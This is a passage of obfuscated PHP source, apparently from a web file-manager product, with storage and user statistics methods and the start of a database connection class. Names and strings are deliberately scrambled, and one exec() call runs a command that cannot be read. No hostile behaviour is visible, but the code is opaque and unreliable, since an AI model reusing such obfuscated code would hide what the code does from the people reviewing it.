$¦Ñ›Û”¶[$†ıŒÈ¥Å[33]] = $†ıŒÈ¥Å[1766]; $¢¯—´ûì = Model($†ıŒÈ¥Å[1767])->where($¦Ñ›Û”¶)->count($†ıŒÈ¥Å[1768]); $ÂëÉìœ = array($†ıŒÈ¥Å[223] => $Ä¶©³ÉÛ, $†ıŒÈ¥Å[763] => (int) $É—úÚ¨÷, $†ıŒÈ¥Å[1753] => (int) $”ë‘ãŞ±, $†ıŒÈ¥Å[1754] => (int) $¢¯—´ûì); return $this->insert($ÂëÉìœ); } public function _recordStore($š…€šƒ = '') { $‰­âÆ‡î =& $_SERVER[Ôó‡è­ƒ]; $ÒğƒˆÅŒ = strtotime(date($‰­âÆ‡î[1765], strtotime($š…€šƒ))); $œ¢—àÃç = array($‰­âÆ‡î[197] => array($‰­âÆ‡î[1013], $ÒğƒˆÅŒ)); $õ¡«•«ã = Model($‰­âÆ‡î[466])->where($œ¢—àÃç)->sum($‰­âÆ‡î[80]); $œ¢—àÃç[$‰­âÆ‡î[407]] = 0; $ŞË«ÚªÀ = Model($‰­âÆ‡î[823])->where($œ¢—àÃç)->sum($‰­âÆ‡î[80]); $œ¢—àÃç[$‰­âÆ‡î[408]] = 1; $œÍİ—‚Ö = Model($‰­âÆ‡î[823])->where($œ¢—àÃç)->sum($‰­âÆ‡î[80]); $œ¢—àÃç[$‰­âÆ‡î[408]] = 2; $¨åúôíö = Model($‰­âÆ‡î[823])->where($œ¢—àÃç)->sum($‰­âÆ‡î[80]); $ı¥ö¤ÓÔ = array($‰­âÆ‡î[223] => $š…€šƒ, $‰­âÆ‡î[761] => (int) $ŞË«ÚªÀ, $‰­âÆ‡î[1757] => (int) $õ¡«•«ã, $‰­âÆ‡î[1758] => (int) $œÍİ—‚Ö, $‰­âÆ‡î[1759] => (int) $¨åúôíö); return $this->insert($ı¥ö¤ÓÔ); } public function trend($÷‰ú»‹×, $Í¡’†Óİ) { $÷üÊ£‰Ú =& $_SERVER[Ôó‡è­ƒ]; if (!$this->init($÷‰ú»‹×)) { return !1; } $ïúàÜÍ = $this->trendList($÷‰ú»‹×); if ($ïúàÜÍ && $Í¡’†Óİ != $÷üÊ£‰Ú[1628]) { $§êğ‹×Ş = $ïúàÜÍ[0][$÷üÊ£‰Ú[223]]; $ä §  = $this->validDate($Í¡’†Óİ, $§êğ‹×Ş); $Ïí“±…ò = array(); $í—§­Ëä = array_to_keyvalue($ïúàÜÍ, $÷üÊ£‰Ú[223]); foreach ($ä §  as $±™á¸è¯) { if (isset($í—§­Ëä[$±™á¸è¯])) { $€³²ñ¶ = $í—§­Ëä[$±™á¸è¯]; } else { $€³²ñ¶ = end($ïúàÜÍ); $€³²ñ¶[$÷üÊ£‰Ú[223]] = $±™á¸è¯; if ($÷‰ú»‹× == $÷üÊ£‰Ú[593]) { $€³²ñ¶[$÷üÊ£‰Ú[1753]] = $€³²ñ¶[$÷üÊ£‰Ú[1754]] = 0; } } $Ïí“±…ò[] = $€³²ñ¶; } $ïúàÜÍ = $Ïí“±…ò; } $‰ğª İ = array($÷üÊ£‰Ú[593] => array($÷üÊ£‰Ú[763] => LNG($÷üÊ£‰Ú[1769]), $÷üÊ£‰Ú[1753] => LNG($÷üÊ£‰Ú[1770]), $÷üÊ£‰Ú[1754] => LNG($÷üÊ£‰Ú[1771])), $÷üÊ£‰Ú[1755] => array($÷üÊ£‰Ú[761] => LNG($÷üÊ£‰Ú[1772]), $÷üÊ£‰Ú[1757] => LNG($÷üÊ£‰Ú[1773]), $÷üÊ£‰Ú[1758] => LNG($÷üÊ£‰Ú[1774]), $÷üÊ£‰Ú[1759] => LNG($÷üÊ£‰Ú[1775]))); $¶Ç“æç€ = array($÷üÊ£‰Ú[593] => $÷üÊ£‰Ú[1776], $÷üÊ£‰Ú[1755] => $÷üÊ£‰Ú[80]); if (empty($ïúàÜÍ)) { $±™á¸è¯ = date($÷üÊ£‰Ú[1760], strtotime($÷üÊ£‰Ú[1761])); $ îï°ôŸ = array($÷üÊ£‰Ú[223] => $±™á¸è¯); foreach ($‰ğª İ[$÷‰ú»‹×] as $œà˜° => $¹Ë‡‡Ì×) { $ îï°ôŸ[$œà˜°] = 0; } $ïúàÜÍ[] = $ îï°ôŸ; } $ÄˆÀåÒÇ = array(); foreach ($ïúàÜÍ as $¹Ë‡‡Ì×) { if ($÷‰ú»‹× == $÷üÊ£‰Ú[1755] && $¹Ë‡‡Ì×[$÷üÊ£‰Ú[1757]] > $¹Ë‡‡Ì×[$÷üÊ£‰Ú[761]]) { $¹Ë‡‡Ì×[$÷üÊ£‰Ú[1757]] = $¹Ë‡‡Ì×[$÷üÊ£‰Ú[761]]; } foreach ($‰ğª İ[$÷‰ú»‹×] as $œà˜° => $åŞ‘…ğ) { $€³²ñ¶ = array($÷üÊ£‰Ú[223] => $¹Ë‡‡Ì×[$÷üÊ£‰Ú[223]], $÷üÊ£‰Ú[1555] => $åŞ‘…ğ); $€³²ñ¶[$¶Ç“æç€[$÷‰ú»‹×]] = isset($¹Ë‡‡Ì×[$œà˜°]) ? $¹Ë‡‡Ì×[$œà˜°] : 0; $ÄˆÀåÒÇ[] = $€³²ñ¶; } } return $ÄˆÀåÒÇ; } public function validDate($ÒÃÙ¿ä», $Éğİà¦«) { $²•áÀÊ =& $_SERVER[Ôó‡è­ƒ]; $´Š–‡ë = date($²•áÀÊ[1760], strtotime($²•áÀÊ[1761])); $–ä¦‚ï• = array($´Š–‡ë); switch ($ÒÃÙ¿ä») { case $²•áÀÊ[1635]: $õÎö“† = mktime(0, 0, 0, date($²•áÀÊ[1777]), date($²•áÀÊ[1374]) - date($²•áÀÊ[1437]) + 7 - 7, date($²•áÀÊ[1778])); $¹ùô°³ = 0; do { $ÉÕ³¸Ÿ£ = date($²•áÀÊ[1760], $õÎö“† - 3600 * 24 * 7 * $¹ùô°³); $–ä¦‚ï•[] = $ÉÕ³¸Ÿ£; $¹ùô°³++; } while ($Éğİà¦« < $ÉÕ³¸Ÿ£); break; case $²•áÀÊ[1633]: $¹ùô°³ = 1; do { $¹«À¡È³ = date($²•áÀÊ[1779], strtotime("\x2d\x20{$¹ùô°³}\40\x6d\157\x6e\x74\150\163")); $–ä¦‚ï•[] = $¹«À¡È³; $¹ùô°³++; } while ($Éğİà¦« < $¹«À¡È³); break; case $²•áÀÊ[1780]: $üéº²·¬ = (int) date($²•áÀÊ[1778], strtotime($Éğİà¦«)); $œÇÀï› = (int) date($²•áÀÊ[1778]); if ($üéº²·¬ >= $œÇÀï›) { break; } for ($üéº²·¬; $üéº²·¬ < $œÇÀï›; $üéº²·¬++) { $–ä¦‚ï•[] = $üéº²·¬ . $²•áÀÊ[1781]; } break; default: break; } if ($Éğİà¦« > end($–ä¦‚ï•)) { array_pop($–ä¦‚ï•); } sort($–ä¦‚ï•); return $–ä¦‚ï•; } public function listTable($ØÊ¯ƒ§§) { $şŠÑÅÏ— = ucfirst($ØÊ¯ƒ§§); return Model($şŠÑÅÏ—)->listData(); } public function option($úˆæ¿ã¡) { $áÉ¨üı‹ = $_SERVER[Ôó‡è­ƒ][1782] . ucfirst($úˆæ¿ã¡); return $this->{$áÉ¨üı‹}(); } private function optionUser() { $çİ®øÂ =& $_SERVER[Ôó‡è­ƒ]; $ÍÀ´ºòö = Model($çİ®øÂ[537])->count($çİ®øÂ[1655]); $–©²„³î = Model($çİ®øÂ[537])->where($çİ®øÂ[1783])->count($çİ®øÂ[1655]); $ã¥”«æÑ = intval($GLOBALS[$çİ®øÂ[6]][$çİ®øÂ[348]][$çİ®øÂ[1611]]) / 3600; $ëÅğÏ‰¥ = strtotime("\55{$ã¥”«æÑ}\40\150\x6f\165\x72\x73"); $öÕß‡æë = strtotime(date($çİ®øÂ[1764])); if ($ëÅğÏ‰¥ < $öÕß‡æë) { $ëÅğÏ‰¥ = $öÕß‡æë; } $¢„şİûé = array($çİ®øÂ[1784] => array($çİ®øÂ[1014], $ëÅğÏ‰¥)); $ìÆóòò = (int) Model($çİ®øÂ[537])->where($¢„şİûé)->count($çİ®øÂ[1655]); if (!$ìÆóòò) { $ìÆóòò = 1; } $¢„şİûé = array($çİ®øÂ[1784] => array($çİ®øÂ[1014], $öÕß‡æë)); $Ñ¶‡¨×æ = Model($çİ®øÂ[537])->where($¢„şİûé)->count($çİ®øÂ[1655]); return array($çİ®øÂ[757] => (int) $ÍÀ´ºòö, $çİ®øÂ[1785] => (int) ($ÍÀ´ºòö - $–©²„³î), $çİ®øÂ[1786] => (int) $–©²„³î, $çİ®øÂ[1787] => (int) $Ñ¶‡¨×æ, $çİ®øÂ[1788] => $ìÆóòò); } private function optionFile() { $£ª°ûı§ =& $_SERVER[Ôó‡è­ƒ]; $ÃÙ£¤¸» = $this->sourceSize(); $ï˜ìµÑø = $ÃÙ£¤¸»[$£ª°ûı§[80]]; $Àİğƒ»Ä = $ÃÙ£¤¸»[$£ª°ûı§[1757]]; $²ƒô¥ € = Model($£ª°ûı§[823])->where(array($£ª°ûı§[407] => 0))->count($£ª°ûı§[399]); $÷®ÅÔÂÎ = array($£ª°ûı§[407] => 0, $£ª°ûı§[197] => array($£ª°ûı§[1014], strtotime(date($£ª°ûı§[1764])))); $¯¦™ç¦« = Model($£ª°ûı§[823])->where($÷®ÅÔÂÎ)->sum($£ª°ûı§[80]); $çÂ÷Ü÷ˆ = Model($£ª°ûı§[823])->where($÷®ÅÔÂÎ)->count($£ª°ûı§[399]); return array($£ª°ûı§[761] => $ï˜ìµÑø, $£ª°ûı§[1757] => $Àİğƒ»Ä, $£ª°ûı§[1789] => $ï˜ìµÑø - $Àİğƒ»Ä, $£ª°ûı§[1790] => (int) $¯¦™ç¦«, $£ª°ûı§[763] => (int) $²ƒô¥ €, $£ª°ûı§[1791] => (int) $çÂ÷Ü÷ˆ); } private function optionAccess() { $µÉÌæˆë =& $_SERVER[Ôó‡è­ƒ]; return array($µÉÌæˆë[757] => $this->typeLogCnt(), $µÉÌæˆë[108] => $this->typeLogCnt($µÉÌæˆë[108]), $µÉÌæˆë[446] => $this->typeLogCnt($µÉÌæˆë[446]), $µÉÌæˆë[1792] => $this->typeLogCnt($µÉÌæˆë[1792]), $µÉÌæˆë[1793] => $this->typeLogCnt($µÉÌæˆë[1793]), $µÉÌæˆë[593] => $this->typeLogCnt($µÉÌæˆë[12], $µÉÌæˆë[1768])); } private function typeLogCnt($êÓÂ’©Û = '', $îˆøñŸÃ = "\x69\x64") { $•ìàÛ´ =& $_SERVER[Ôó‡è­ƒ]; $ÒÑû€Ô = array($•ìàÛ´[108] => array($•ìàÛ´[1794], $•ìàÛ´[1795]), $•ìàÛ´[446] => array($•ìàÛ´[1796], $•ìàÛ´[1797]), $•ìàÛ´[1792] => array($•ìàÛ´[1798], $•ìàÛ´[1799], $•ìàÛ´[1800]), $•ìàÛ´[1793] => array($•ìàÛ´[1801], $•ìàÛ´[1802]), $•ìàÛ´[1803] => array($•ìàÛ´[1804], $•ìàÛ´[1805], $•ìàÛ´[1806])); $ø„«”¼‘ = strtotime(date($•ìàÛ´[1764])); $ì—ï·Œö = array($•ìàÛ´[197] => array($•ìàÛ´[1014], $ø„«”¼‘)); if ($êÓÂ’©Û) { $ì—ï·Œö[$•ìàÛ´[33]] = array($•ìàÛ´[7], $ÒÑû€Ô[$êÓÂ’©Û]); } $úüïµàŠ = Model($•ìàÛ´[1767])->where($ì—ï·Œö)->count($îˆøñŸÃ); return (int) $úüïµàŠ; } private function optionServer() { $âœÈ¸ªã =& $_SERVER[Ôó‡è­ƒ]; $È–Ï¢éü = $this->diskDriver(); $¡´Ó÷‘ = KodIO::defaultDriver(); $«™ŞÑôü = array($âœÈ¸ªã[815] => $¡´Ó÷‘[$âœÈ¸ªã[396]]); $Š¼ˆêÓú = Model($âœÈ¸ªã[466])->where($«™ŞÑôü)->sum($âœÈ¸ªã[80]); $ú¶Œ‰Ô° = explode($âœÈ¸ªã[53], $_SERVER[$âœÈ¸ªã[144]]); $²­É»ªÄ = $ú¶Œ‰Ô°[0]; $ÚÄ•µ¿ = $GLOBALS[$âœÈ¸ªã[6]][$âœÈ¸ªã[21]]; $ÏÙÕ”¶ = $ÚÄ•µ¿[$âœÈ¸ªã[976]]; if ($ÏÙÕ”¶ == $âœÈ¸ªã[964]) { $¼ùöı®— = explode($âœÈ¸ªã[1270], $ÚÄ•µ¿[$âœÈ¸ªã[975]]); $ÏÙÕ”¶ = $¼ùöı®—[0]; } if ($ÏÙÕ”¶ == $âœÈ¸ªã[912] || $ÏÙÕ”¶ == $âœÈ¸ªã[802]) { $ëÂû¨ÕÆ = Model()->db()->query($âœÈ¸ªã[1807]); $¨‰â±¢€ = $ëÂû¨ÕÆ[0] && isset($ëÂû¨ÕÆ[0][$âœÈ¸ªã[1554]]) ? $ëÂû¨ÕÆ[0][$âœÈ¸ªã[1554]] : 0; $ÏÙÕ”¶ = $âœÈ¸ªã[1808] . ($¨‰â±¢€ ? $âœÈ¸ªã[8] . $¨‰â±¢€ : $âœÈ¸ªã[12]); } $Ù¦ÅñÀ = $GLOBALS[$âœÈ¸ªã[6]][$âœÈ¸ªã[348]][$âœÈ¸ªã[825]]; return array($âœÈ¸ªã[1809] => $È–Ï¢éü ? $È–Ï¢éü[$âœÈ¸ªã[1810]] : 0, $âœÈ¸ªã[1811] => $È–Ï¢éü ? $È–Ï¢éü[$âœÈ¸ªã[1812]] : 0, $âœÈ¸ªã[1813] => (int) $¡´Ó÷‘[$âœÈ¸ªã[1810]] * 1024 * 1024 * 1024, $âœÈ¸ªã[1814] => (int) $Š¼ˆêÓú, $âœÈ¸ªã[1815] => ucfirst($²­É»ªÄ), $âœÈ¸ªã[1816] => $âœÈ¸ªã[1817] . PHP_VERSION, $âœÈ¸ªã[1818] => phpBuild64() ? 64 : 32, $âœÈ¸ªã[756] => str_replace($âœÈ¸ªã[1130], $âœÈ¸ªã[992], $ÏÙÕ”¶), $âœÈ¸ªã[348] => ucfirst($Ù¦ÅñÀ), $âœÈ¸ªã[32] => $_SERVER[$âœÈ¸ªã[1819]]); } private function diskDriver() { $„–Ã›¬Ø =& $_SERVER[Ôó‡è­ƒ]; $÷§§âá¨ = $„–Ã›¬Ø[8]; $š‰·í´¾ = $GLOBALS[$„–Ã›¬Ø[6]][$„–Ã›¬Ø[1286]] == $„–Ã›¬Ø[1287]; if ($š‰·í´¾) { $÷§§âá¨ = $„–Ã›¬Ø[1820]; if (function_exists($„–Ã›¬Ø[1821])) { exec($„–Ã›¬Ø[1822], $ø­ê–·); $÷§§âá¨ = $ø­ê–·[1] . $„–Ã›¬Ø[8]; } } if (!file_exists($÷§§âá¨)) { return; } $¶µµù¨ã = @disk_total_space($÷§§âá¨); $‡ÒßŞœÒ = $¶µµù¨ã - @disk_free_space($÷§§âá¨); return array($„–Ã›¬Ø[1810] => $¶µµù¨ã, $„–Ã›¬Ø[1812] => $‡ÒßŞœÒ); } public function fileChart($ğë·“üœ) { $ÏÕ£ø¹ =& $_SERVER[Ôó‡è­ƒ]; if (isset($ğë·“üœ[$ÏÕ£ø¹[1655]])) { return Model($ÏÕ£ø¹[823])->userFileTypeProfile($ğë·“üœ[$ÏÕ£ø¹[1655]]); } if (isset($ğë·“üœ[$ÏÕ£ø¹[1823]])) { return Model($ÏÕ£ø¹[823])->groupFileTypeProfile($ğë·“üœ[$ÏÕ£ø¹[1823]]); } $‹±¬¹“¢ = $this->sourceSize(); $ä£ùÁ¾ = array($ÏÕ£ø¹[494] => 0, $ÏÕ£ø¹[408] => 1); $°¡éÃú÷ = Model($ÏÕ£ø¹[823])->where($ä£ùÁ¾)->sum($ÏÕ£ø¹[80]); $ä£ùÁ¾[$ÏÕ£ø¹[408]] = 2; $®ß£¬å² = Model($ÏÕ£ø¹[823])->where($ä£ùÁ¾)->sum($ÏÕ£ø¹[80]); return array($ÏÕ£ø¹[761] => $‹±¬¹“¢[$ÏÕ£ø¹[80]], $ÏÕ£ø¹[1757] => $‹±¬¹“¢[$ÏÕ£ø¹[1757]], $ÏÕ£ø¹[1758] => (int) $°¡éÃú÷, $ÏÕ£ø¹[1759] => (int) $®ß£¬å²); } private function sourceSize() { $êìğòÄ­ =& $_SERVER[Ôó‡è­ƒ]; $’Õ¦¦ÊÂ = Model($êìğòÄ­[823])->where(array($êìğòÄ­[407] => 0))->sum($êìğòÄ­[80]); $åµœÀÚ¨ = Model($êìğòÄ­[466])->sum($êìğòÄ­[80]); if ($åµœÀÚ¨ > $’Õ¦¦ÊÂ) { $åµœÀÚ¨ = $’Õ¦¦ÊÂ; } return array($êìğòÄ­[80] => (int) $’Õ¦¦ÊÂ, $êìğòÄ­[1757] => (int) $åµœÀÚ¨); } } goto EŸÃ´«ï¤Ş; A½Ğ£´Ší: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\145\x71" => "\74\76", "\x67\x74" => "\76", "\x65\x67\x74" => "\x3e\75", "\x6c\164" => "\x3c", "\x65\x6c\164" => "\74\75", "\156\x6f\x74\x6c\151\153\x65" => "\x4e\x4f\124\40\x4c\x49\x4b\105", "\x6c\151\x6b\x65" => "\114\x49\113\x45", "\151\x6e" => "\111\x4e", "\156\157\x74\x69\156" => "\x4e\117\124\x20\111\x4e", "\x6e\x6f\164\x20\151\x6e" => "\116\x4f\x54\40\111\x4e", "\x62\145\164\x77\145\145\156" => "\102\x45\124\x57\x45\105\116", "\156\x6f\164\142\145\164\167\x65\145\x6e" => "\116\x4f\124\x20\102\x45\x54\127\105\x45\x4e", "\x6e\157\x74\x20\x62\x65\x74\x77\x65\145\x6e" => "\x4e\x4f\124\x20\x42\105\124\127\105\105\116"); protected $selectSql = "\x53\105\114\105\x43\124\45\x44\111\123\124\111\x4e\x43\x54\x25\x20\45\x46\x49\105\x4c\x44\45\x20\x46\x52\x4f\115\x20\45\124\101\102\114\x45\45\x25\x4a\117\x49\116\45\45\127\x48\105\122\105\45\45\107\122\117\125\120\x25\x25\110\101\126\x49\116\107\45\45\117\x52\x44\x45\x52\45\45\x4c\x49\x4d\111\124\x25\40\45\125\x4e\111\x4f\116\45\x25\103\x4f\x4d\x4d\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $ÌÂÓ° ® = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ôó‡è­ƒ][960], $ÌÂÓ° ®); } public function factory($ØˆĞšûæ = '') { $„Üì²ŸŠ =& $_SERVER[Ôó‡è­ƒ]; $ØˆĞšûæ = $this->parseConfig($ØˆĞšûæ); if (empty($ØˆĞšûæ[$„Üì²ŸŠ[961]])) { think_exception(think_lang($„Üì²ŸŠ[962])); } $this->dbType = ucwords(strtolower($ØˆĞšûæ[$„Üì²ŸŠ[961]])); $©¶”Øø» = $„Üì²ŸŠ[963] . $this->dbType; if (class_exists($©¶”Øø»)) { $ìÓú„’ğ = new $©¶”Øø»($ØˆĞšûæ); if ($„Üì²ŸŠ[964] != strtolower($ØˆĞšûæ[$„Üì²ŸŠ[961]])) { $ìÓú„’ğ->dbType = strtoupper($this->dbType); } else { $ìÓú„’ğ->dbType = $this->_getDsnType($ØˆĞšûæ[$„Üì²ŸŠ[916]]); } } else { think_exception(think_lang($„Üì²ŸŠ[965]) . $„Üì²ŸŠ[966] . $©¶”Øø»); } return $ìÓú„’ğ; } public function __call($Ë‰Æîôî, $Æ‚ŞÉ¬ø) { if (method_exists($this, $Ë‰Æîôî)) { return call_user_func_array(array($this, $Ë‰Æîôî), $Æ‚ŞÉ¬ø); } } protected function _getDsnType($ÃĞÊ´®) { $äÄÎÄâ = explode($_SERVER[Ôó‡è­ƒ][4], $ÃĞÊ´®); $’¢È£ÜÙ = strtoupper(trim($äÄÎÄâ[0])); return $’¢È£ÜÙ; } private function parseConfig($¦‚ã¬Ôæ = '') { $ñúÛè¿® =& $_SERVER[Ôó‡è­ƒ]; if (!empty($¦‚ã¬Ôæ) && is_string($¦‚ã¬Ôæ)) { $¦‚ã¬Ôæ = $this->parseDSN($¦‚ã¬Ôæ); } elseif (is_array($¦‚ã¬Ôæ)) { $¦‚ã¬Ôæ = array_change_key_case($¦‚ã¬Ôæ); $¦‚ã¬Ôæ = array($ñúÛè¿®[961] => $¦‚ã¬Ôæ[$ñúÛè¿®[967]], $ñúÛè¿®[888] => $¦‚ã¬Ôæ[$ñúÛè¿®[968]], $ñúÛè¿®[889] => $¦‚ã¬Ôæ[$ñúÛè¿®[969]], $ñúÛè¿®[886] => $¦‚ã¬Ôæ[$ñúÛè¿®[970]], $ñúÛè¿®[887] => $¦‚ã¬Ôæ[$ñúÛè¿®[971]], $ñúÛè¿®[21] => $¦‚ã¬Ôæ[$ñúÛè¿®[972]], $ñúÛè¿®[916] => $¦‚ã¬Ôæ[$ñúÛè¿®[973]], $ñúÛè¿®[17] => isset($¦‚ã¬Ôæ[$ñúÛè¿®[974]]) ? $¦‚ã¬Ôæ[$ñúÛè¿®[974]] : array()); } elseif (empty($¦‚ã¬Ôæ)) { if (think_config($ñúÛè¿®[975]) && $ñúÛè¿®[964] != strtolower(think_config($ñúÛè¿®[976]))) { $¦‚ã¬Ôæ = $this->parseDSN(think_config($ñúÛè¿®[975])); } else { $¦‚ã¬Ôæ = array($ñúÛè¿®[961] => think_config($ñúÛè¿®[976]), $ñúÛè¿®[888] => think_config($ñúÛè¿®[977]), $ñúÛè¿®[889] => think_config($ñúÛè¿®[978]), $ñúÛè¿®[886] => think_config($ñúÛè¿®[979]), $ñúÛè¿®[887] => think_config($ñúÛè¿®[980]), $ñúÛè¿®[21] => think_config($ñúÛè¿®[245]), $ñúÛè¿®[916] => think_config($ñúÛè¿®[975]), $ñúÛè¿®[17] => think_config($ñúÛè¿®[981])); } } return $¦‚ã¬Ôæ; } protected function initConnect($î¯¢†ª = true) { if (1 == think_config($_SERVER[Ôó‡è­ƒ][22])) { $this->_linkID = $this->multiConnect($î¯¢†ª); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Êæœ÷ì¤ => $çêº¦Ê») { $this->_linkID = $çêº¦Ê»; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($øá©õÜÔ = false) { $÷Êßúé¦ =& $_SERVER[Ôó‡è­ƒ]; static $ãËìÍôñ = array(); static $Ç¨¹ãòä = -1; if (empty($ãËìÍôñ)) { foreach ($this->config as $¹®ÆŒ¿— => $“Ãô¸é—) { $ãËìÍôñ[$¹®ÆŒ¿—] = explode($÷Êßúé¦[50], $“Ãô¸é—); } } if (think_config($÷Êßúé¦[982])) { if ($øá©õÜÔ || think_config($÷Êßúé¦[392]) === !0) { $‡§õ¤•² = floor(mt_rand(0, think_config($÷Êßúé¦[983]) - 1)); $Ç¨¹ãòä = $‡§õ¤•²; } else { if (is_numeric(think_config($÷Êßúé¦[984]))) { $‡§õ¤•² = think_config($÷Êßúé¦[984]); } else { $‡§õ¤•² = floor(mt_rand(think_config($÷Êßúé¦[983]), count($ãËìÍôñ[$÷Êßúé¦[886]]) - 1)); } } } else { $‡§õ¤•² = floor(mt_rand(0, count($ãËìÍôñ[$÷Êßúé¦[886]]) - 1)); $Ç¨¹ãòä = $‡§õ¤•²; } $‡§õ¤•² = $Ç¨¹ãòä !== -1 ? $Ç¨¹ãòä : $‡§õ¤•²; $Ë·ïÓ™ë = array($÷Êßúé¦[888] => isset($ãËìÍôñ[$÷Êßúé¦[888]][$‡§õ¤•²]) ? $ãËìÍôñ[$÷Êßúé¦[888]][$‡§õ¤•²] : $ãËìÍôñ[$÷Êßúé¦[888]][0], $÷Êßúé¦[889] => isset($ãËìÍôñ[$÷Êßúé¦[889]][$‡§õ¤•²]) ? $ãËìÍôñ[$÷Êßúé¦[889]][$‡§õ¤•²] : $ãËìÍôñ[$÷Êßúé¦[889]][0], $÷Êßúé¦[886] => isset($ãËìÍôñ[$÷Êßúé¦[886]][$‡§õ¤•²]) ? $ãËìÍôñ[$÷Êßúé¦[886]][$‡§õ¤•²] : $ãËìÍôñ[$÷Êßúé¦[886]][0], $÷Êßúé¦[887] => isset($ãËìÍôñ[$÷Êßúé¦[887]][$‡§õ¤•²]) ? $ãËìÍôñ[$÷Êßúé¦[887]][$‡§õ¤•²] : $ãËìÍôñ[$÷Êßúé¦[887]][0], $÷Êßúé¦[21] => isset($ãËìÍôñ[$÷Êßúé¦[21]][$‡§õ¤•²]) ? $ãËìÍôñ[$÷Êßúé¦[21]][$‡§õ¤•²] : $ãËìÍôñ[$÷Êßúé¦[21]][0], $÷Êßúé¦[916] => isset($ãËìÍôñ[$÷Êßúé¦[916]][$‡§õ¤•²]) ? $ãËìÍôñ[$÷Êßúé¦[916]][$‡§õ¤•²] : $ãËìÍôñ[$÷Êßúé¦[916]][0], $÷Êßúé¦[17] => isset($ãËìÍôñ[$÷Êßúé¦[17]][$‡§õ¤•²]) ? $ãËìÍôñ[$÷Êßúé¦[17]][$‡§õ¤•²] : $ãËìÍôñ[$÷Êßúé¦[17]][0]); return $this->connect($Ë·ïÓ™ë, $‡§õ¤•²); } public function parseDSN($ØêÀ„Ê—) { $Æñ²××œ =& $_SERVER[Ôó‡è­ƒ]; if (empty($ØêÀ„Ê—)) { return !1; } $‰ŒË³şı = parse_url($ØêÀ„Ê—); if ($‰ŒË³şı[$Æñ²××œ[177]]) { $ş›ô•¯Í = array($Æñ²××œ[961] => $‰ŒË³şı[$Æñ²××œ[177]], $Æñ²××œ[888] => isset($‰ŒË³şı[$Æñ²××œ[593]]) ? $‰ŒË³şı[$Æñ²××œ[593]] : $Æñ²××œ[12], $Æñ²××œ[889] => isset($‰ŒË³şı[$Æñ²××œ[985]]) ? $‰ŒË³şı[$Æñ²××œ[985]] : $Æñ²××œ[12], $Æñ²××œ[886] => isset($‰ŒË³şı[$Æñ²××œ[178]]) ? $‰ŒË³şı[$Æñ²××œ[178]] : $Æñ²××œ[12], $Æñ²××œ[887] => isset($‰ŒË³şı[$Æñ²××œ[179]]) ? $‰ŒË³şı[$Æñ²××œ[179]] : $Æñ²××œ[12], $Æñ²××œ[21] => isset($‰ŒË³şı[$Æñ²××œ[78]]) ? substr($‰ŒË³şı[$Æñ²××œ[78]], 1) : $Æñ²××œ[12]); } else { preg_match($Æñ²××œ[986], trim($ØêÀ„Ê—), $ÁÈ•éú); $ş›ô•¯Í = array($Æñ²××œ[961] => $ÁÈ•éú[1], $Æñ²××œ[888] => $ÁÈ•éú[2], $Æñ²××œ[889] => $ÁÈ•éú[3], $Æñ²××œ[886] => $ÁÈ•éú[4], $Æñ²××œ[887] => $ÁÈ•éú[5], $Æñ²××œ[21] => $ÁÈ•éú[6]); } $ş›ô•¯Í[$Æñ²××œ[916]] = $Æñ²××œ[12]; return $ş›ô•¯Í; } protected function debug() { $İõ®¸‹ =& $_SERVER[Ôó‡è­ƒ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $İõ®¸‹[987]; if (think_config($İõ®¸‹[988])) { think_status($İõ®¸‹[989]); think_trace($this->queryStr . $İõ®¸‹[990] . think_status($İõ®¸‹[24], $İõ®¸‹[989], 6) . $İõ®¸‹[991], $İõ®¸‹[12], $İõ®¸‹[992]); } } protected function parseLock($‹„…º›Æ = false) { $½ÜªŠçö =& $_SERVER[Ôó‡è­ƒ]; if (!$‹„…º›Æ) { return $½ÜªŠçö[12]; } if ($½ÜªŠçö[918] == $this->dbType) { return $½ÜªŠçö[993]; } return $½ÜªŠçö[994]; } protected function parseSet($—¡â‡©›) { $Ø¾½‘ş =& $_SERVER[Ôó‡è­ƒ]; foreach ($—¡â‡©› as $—ûèû¥Ü => $Ë¥ÉÃúø) { if (is_array($Ë¥ÉÃúø) && $Ø¾½‘ş[296] == $Ë¥ÉÃúø[0]) { $ƒâ½š¸·[] = $this->parseKey($—ûèû¥Ü) . $Ø¾½‘ş[884] . $Ë¥ÉÃúø[1]; } elseif (is_scalar($Ë¥ÉÃúø) || is_null($Ë¥ÉÃúø)) { $ƒâ½š¸·[] = $this->parseKey($—ûèû¥Ü) . $Ø¾½‘ş[884] . $this->parseValue($Ë¥ÉÃúø); } } return $Ø¾½‘ş[995] . implode($Ø¾½‘ş[50], $ƒâ½š¸·); } protected function bindParam($¦Úä¶÷², $­ÚÌÅÊí) { $this->bind[$_SERVER[Ôó‡è­ƒ][4] . $¦Úä¶÷²] = $­ÚÌÅÊí; } protected function parseBind($À’­æûú) { $À’­æûú = array_merge($this->bind, $À’­æûú); $this->bind = array(); return $À’­æûú; } function parseKey(&$ƒÁ¸æÕ™, $ÓöÅèØ» = true) { if ($ÓöÅèØ») { $ƒÁ¸æÕ™ = $this->parseKeyCheck($ƒÁ¸æÕ™); } return $ƒÁ¸æÕ™; } function parseKeyCheck($Ş¨óÑê) { $úÇÖ†š =& $_SERVER[Ôó‡è­ƒ]; $Ş¨óÑê = trim($Ş¨óÑê); if (!preg_match($úÇÖ†š[996], $Ş¨óÑê)) { think_exception($úÇÖ†š[997] . $Ş¨óÑê); } return $Ş¨óÑê; } protected function parseValue($‡·üŸˆÊ) { $üªÚ‚ =& $_SERVER[Ôó‡è­ƒ]; if (is_string($‡·üŸˆÊ)) { $‡·üŸˆÊ = $üªÚ‚[957] . $this->escapeString($‡·üŸˆÊ) . $üªÚ‚[957]; } elseif 